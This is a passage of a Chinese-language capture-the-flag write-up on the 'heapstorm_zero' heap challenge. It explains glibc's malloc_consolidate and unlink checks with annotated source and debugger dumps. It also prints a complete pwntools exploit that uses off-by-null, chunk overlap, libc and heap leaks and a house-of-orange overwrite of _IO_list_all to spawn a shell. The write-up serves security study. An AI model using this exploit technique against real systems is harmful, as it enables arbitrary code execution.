class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"> maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>); <span class="comment">//获得最大的chunk_size的fastbin头</span></span><br><span class="line">   fb = &amp;fastbin (av, <span class="number">0</span>);   <span class="comment">//获得最小的chunk_size头</span></span><br><span class="line">   <span class="keyword">do</span> &#123; </span><br><span class="line">     <span class="function"><span class="title">p</span> = atomic_exchange_acq (fb, 0); //获得fb-&gt;</span>fd</span><br><span class="line">     <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">do</span> &#123; <span class="comment">//该循环用来遍历当前fastbin链中的chunk</span></span><br><span class="line">  check_inuse_chunk(av, p); <span class="comment">//简单的检查。检查地址是否对齐等等..</span></span><br><span class="line">  <span class="function"><span class="title">nextp</span> = p-&gt;</span>fd; </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">  <span class="function"><span class="title">size</span> = p-&gt;</span>size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">  nextchunk = chunk_at_offset(p, size); <span class="comment">//获取当前chunk的下一个chunk</span></span><br><span class="line">  nextsize = chunksize(nextchunk); <span class="comment">//获取当前chunk的下一个chunk的size。</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse(p)) &#123; <span class="comment">//如果当前chunk的前一个chunk是free的，则合并，触发unlink操作</span></span><br><span class="line">    <span class="function"><span class="title">prevsize</span> = p-&gt;</span>prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((long) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">if</span> (nextchunk != av-&gt;</span>top) &#123; <span class="comment">//如果当前chunk的下一个chunk不是top chunk</span></span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize); <span class="comment">//获取下个chunk的使用状态</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//如果是free的，则合并，触发了unlink操作</span></span><br><span class="line">      size += nextsize;</span><br><span class="line">      unlink(av, nextchunk, bck, fwd);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">      clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">first_unsorted</span> = unsorted_bin-&gt;</span>fd;  <span class="comment">//将其链入unsorted bin中。</span></span><br><span class="line">    <span class="function"><span class="title">unsorted_bin</span>-&gt;</span>fd = p;</span><br><span class="line">    <span class="function"><span class="title">first_unsorted</span>-&gt;</span>bk = p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (size)) &#123; <span class="comment">//如果合并后的chunk_size属于large chunk，则将以下两项设置为NULL.</span></span><br><span class="line">      <span class="function"><span class="title">p</span>-&gt;</span>fd_nextsize = NULL;</span><br><span class="line">      <span class="function"><span class="title">p</span>-&gt;</span>bk_nextsize = NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_head(p, size | PREV_INUSE); <span class="comment">//设置该chunk的size位</span></span><br><span class="line">    <span class="function"><span class="title">p</span>-&gt;</span>bk = unsorted_bin;  </span><br><span class="line">    <span class="function"><span class="title">p</span>-&gt;</span>fd = first_unsorted;</span><br><span class="line">    set_foot(p, size);  <span class="comment">//设置p的下一个chunk的prev_size位,该操作可以帮助绕过unlink的检查，后面会说到。</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123; <span class="comment">//如果下一个chunk是top chunk，则直接合并到top chunk中。</span></span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    <span class="function"><span class="title">av</span>-&gt;</span>top = p;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line">   &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br></pre></td></tr></table></figure></p><h5 id="合并实例："><a href="#合并实例：" class="headerlink" title="合并实例："></a>合并实例：</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *a,*b,*c,*d;</span><br><span class="line">    a=<span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    b=<span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    c=<span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    d=<span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//防止被top chunk合并。</span></span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">free</span>(c);</span><br><span class="line">    <span class="built_in">free</span>(d);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x400</span>);<span class="comment">//触发malloc_consolidate</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上代码，触发malloc_consolidate时，4个大小相同的fast chunk会被合并成一个大chunk，放入unsorted bin中.流程如下:<br>当连续free 4个chunk后，fastbin情况如下:<br><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pwndbg&gt; fastbins </span></span><br><span class="line"><span class="attribute">fastbins</span></span><br><span class="line"><span class="attribute">0x20</span>: 0x0</span><br><span class="line"><span class="attribute">0x30</span>: 0x602090 —▸ 0x602060 —▸ 0x602030 —▸ 0x602000 ◂— 0x0</span><br><span class="line"><span class="attribute">0x40</span>: 0x0</span><br><span class="line"><span class="attribute">0x50</span>: 0x0</span><br><span class="line"><span class="attribute">0x60</span>: 0x0</span><br><span class="line"><span class="attribute">0x70</span>: 0x0</span><br><span class="line"><span class="attribute">0x80</span>: 0x0</span><br></pre></td></tr></table></figure></p><p>触发malloc_consolidate后，首先处理的是链表头所指向的这个chunk(0x602090),此时情况如下:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">49</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x602030</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">49</span>, </span><br><span class="line">  fd = <span class="number">0x602000</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x602060</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">49</span>, </span><br><span class="line">  fd = <span class="number">0x602030</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x602090</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">49</span>, </span><br><span class="line">  fd = <span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  bk = <span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x6020c0</span> &#123;</span><br><span class="line">  prev_size = <span class="number">48</span>, </span><br><span class="line">  size = <span class="number">32</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x20f21</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>0x602090 这个chunk已经链入unsorted bin中，而且设置了prev_size位。由于malloc_consolidate会设置prev_inuse位，当处理 0x602060 这个chunk的时候就会和0x602090发生合并一同放入unsorted bin中:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">49</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x602030</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">49</span>, </span><br><span class="line">  fd = <span class="number">0x602000</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x602060</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">97</span>, </span><br><span class="line">  fd = <span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  bk = <span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x6020c0</span> &#123;</span><br><span class="line">  prev_size = <span class="number">96</span>, </span><br><span class="line">  size = <span class="number">32</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x20f21</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到已经合并成一个chunk_size为0x96的chunk了。以此类推，4个fastbin chunk会合并成一个大chunk放入unsorted bin中。</p><h4 id="踩到的各种坑…"><a href="#踩到的各种坑…" class="headerlink" title="踩到的各种坑…"></a>踩到的各种坑…</h4><p>解题方法原wp已经说的很清楚了，<strong>主要就是offbyone,和scanf触发malloc_consolidate，最后通过chunk_overlap泄露地址，然后house of orange</strong>。和原来的unsorted chunk NULL byte prison不同的地方是原来是通过直接free一个small_chunk，这样就可以后向合并了，而这里需要通过malloc_consolidate来达到合并的效果。<br>这里只是说下我碰到的不知道的地方。<br>先放上我的exp，以便后面说明.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">a=process(<span class="string">"./heapstorm_zero"</span>)</span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,<span class="string">"-h"</span>]</span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(a,<span class="string">'''</span></span><br><span class="line"><span class="string">    b *(0x555555554000+0x0000000000010F6)</span></span><br><span class="line"><span class="string">    b *(0x555555554000+0x000000000001296)    </span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line"><span class="comment">#add,delete</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(index)</span>:</span></span><br><span class="line">    a.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">    a.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"size:"</span>)</span><br><span class="line">    a.sendline(str(size))</span><br><span class="line">    a.recvuntil(<span class="string">"Please input chunk content:"</span>)</span><br><span class="line">    a.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"Please input chunk index: "</span>)</span><br><span class="line">    a.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"Please input chunk index:"</span>)</span><br><span class="line">    a.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc_consolidate</span><span class="params">()</span>:</span></span><br><span class="line">    a.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">    a.sendline(<span class="string">"1"</span>*<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'0\n'</span>)<span class="comment">#0 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'1\n'</span>)<span class="comment">#1 0x40</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'2\n'</span>)<span class="comment">#2 0x80</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'3\n'</span>)<span class="comment">#3 0xc0</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'4\n'</span>)<span class="comment">#4 0x100</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'5\n'</span>)<span class="comment">#5 0x140</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'6\n'</span>)<span class="comment">#6 0x180</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'7\n'</span>)<span class="comment">#7 0x1c0</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'8\n'</span>)<span class="comment">#8 0x200</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'9\n'</span>)<span class="comment">#9 0x240</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'10\n'</span>)<span class="comment">#10 0x280</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">malloc_consolidate()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'\x00'</span>*<span class="number">0x28</span>)<span class="comment">#1, 0x40, offbyNULL, unsorted chunksize 0x140 ==&gt; 0x100 </span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'\n'</span>)<span class="comment">#2 0x70</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'\n'</span>)<span class="comment">#3 0xb0</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'\n'</span>)<span class="comment">#4 0xf0</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'\n'</span>)<span class="comment">#5 0x130</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'\n'</span>)<span class="comment">#11</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">malloc_consolidate()</span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'\n'</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">a.recvuntil(<span class="string">": "</span>)</span><br><span class="line">libc_base=u64(a.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-88</span>-libc.symbols[<span class="string">"__malloc_hook"</span>]<span class="number">-0x10</span></span><br><span class="line">success(<span class="string">"libc_base ==&gt; 0x%x"</span>%libc_base)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'\n'</span>)<span class="comment">#6 = 3</span></span><br><span class="line">add(<span class="number">0x28</span>,p64(<span class="number">0x41</span>)*<span class="number">3</span>+<span class="string">'\n'</span>)<span class="comment">#12  ,unsorted bin ==&gt; 0x110</span></span><br><span class="line">delete(<span class="number">12</span>) </span><br><span class="line">delete(<span class="number">6</span>) <span class="comment">#fd ==&gt; chunk4(chunk11)</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">a.recvuntil(<span class="string">": "</span>)</span><br><span class="line">heap_base=u64(a.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0xd0</span><span class="number">-0x10</span></span><br><span class="line">success(<span class="string">"heap_base ==&gt; 0x%x"</span>%heap_base)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">io_list_all=libc_base+libc.symbols[<span class="string">"_IO_list_all"</span>]</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=<span class="string">'/bin/sh\x00'</span>+p64(<span class="number">0x61</span>)   <span class="comment"># unsorted bin prev_size ,size </span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(io_list_all<span class="number">-0x10</span>)+<span class="string">'\n'</span></span><br><span class="line">add(<span class="number">0x38</span>,payload)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">system_addr=libc.symbols[<span class="string">"system"</span>]+libc_base</span><br><span class="line">payload=<span class="string">'\x00'</span>*<span class="number">0x18</span>+p64(heap_base+<span class="number">0x1e8</span>)+p64(system_addr)*<span class="number">3</span>+<span class="string">'\n'</span></span><br><span class="line">add(<span class="number">0x38</span>,payload)</span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">a.recv()</span><br><span class="line">a.sendline(<span class="string">"1"</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p><h5 id="创造last-remainder-绕过unlink检查"><a href="#创造last-remainder-绕过unlink检查" class="headerlink" title="创造last_remainder,绕过unlink检查"></a>创造last_remainder,绕过unlink检查</h5><p>刚开始写exp时，使用offbyNULL是这样的:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"><span class="function"><span class="title">malloc_consolidate</span><span class="params">()</span></span> <span class="comment">//合并，放入unsored bin中，由于申请了large bin，遍历unsored bin的时候放入了small bin</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>x38,<span class="string">'\x00'</span>*<span class="number">0</span>x38)</span></span></span><br></pre></td></tr></table></figure></p><p>使用预留的chunk0，free他然后再申请到他，来造成offbyNULL，溢出其size位。<br>但是这样溢出后，再申请chunk就会挂掉。原因是：后面遍历small bin的时候，切割操作会触发unlink操作。<br>unlink会检查nextchunk的prev_size是否和将要unlink的chunk的size相同，但是溢出后size变小，nextchunk的prev_size并没有设置，所以会报错:</p><p>遍历完unsorted bin后，遍历bin，将bin中的chunk取出：<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">size</span> = chunksize (victim);</span><br><span class="line">        <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">        assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line">        remainder_size = <span class="built_in">size</span> - nb;</span><br><span class="line">        <span class="comment">/* unlink */</span></span><br><span class="line">        unlink (av, victim, bck, fwd); <span class="comment">//这里会触发unlink操作</span></span><br><span class="line">        <span class="comment">/* Exhaust */</span></span><br><span class="line">        <span class="built_in">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">          &#123;</span><br><span class="line">            set_inuse_bit_at_offset (victim, <span class="built_in">size</span>);</span><br><span class="line">            <span class="built_in">if</span> (av != &amp;main_arena)</span><br><span class="line">              victim-&gt;<span class="built_in">size</span> |= NON_MAIN_ARENA;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="comment">/* Split */</span></span><br><span class="line">        <span class="built_in">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            remainder = chunk_at_offset (victim, nb);</span><br><span class="line">     ......</span><br></pre></td></tr></table></figure></p><p>unlink:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      <span class="selector-tag">malloc_printerr</span> (<span class="string">"corrupted size vs. prev_size"</span>);</span><br></pre></td></tr></table></figure></p><hr><p>原wp的解决办法是从small chunk中申请一个chunk，申请完该chunk后，剩下的chunk就变成了last_remainder，放入了unsored bin中.<br>再利用这个新申请的chunk来溢出剩下的chunk。从last_remainder中分割chunk的时候不会unlink，就没有nextchunk的prev_size的检查了：<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;                  <span class="comment">// 申请的chunk属于small chunk    </span></span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;   <span class="comment">//unsorted bin中只有last_remainder，              </span></span><br><span class="line">              <span class="function"><span class="title">victim</span> == av-&gt;</span>last_remainder &amp;&amp;  <span class="comment">//且其size满足要求，就会进入以下分支 </span></span><br><span class="line">              (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              <span class="function"><span class="title">unsorted_chunks</span> (av)-&gt;</span><span class="function"><span class="title">bk</span> = unsorted_chunks (av)-&gt;</span>fd = remainder;</span><br><span class="line">              <span class="function"><span class="title">av</span>-&gt;</span>last_remainder = remainder;</span><br><span class="line">              <span class="function"><span class="title">remainder</span>-&gt;</span><span class="function"><span class="title">bk</span> = remainder-&gt;</span>fd = unsorted_chunks 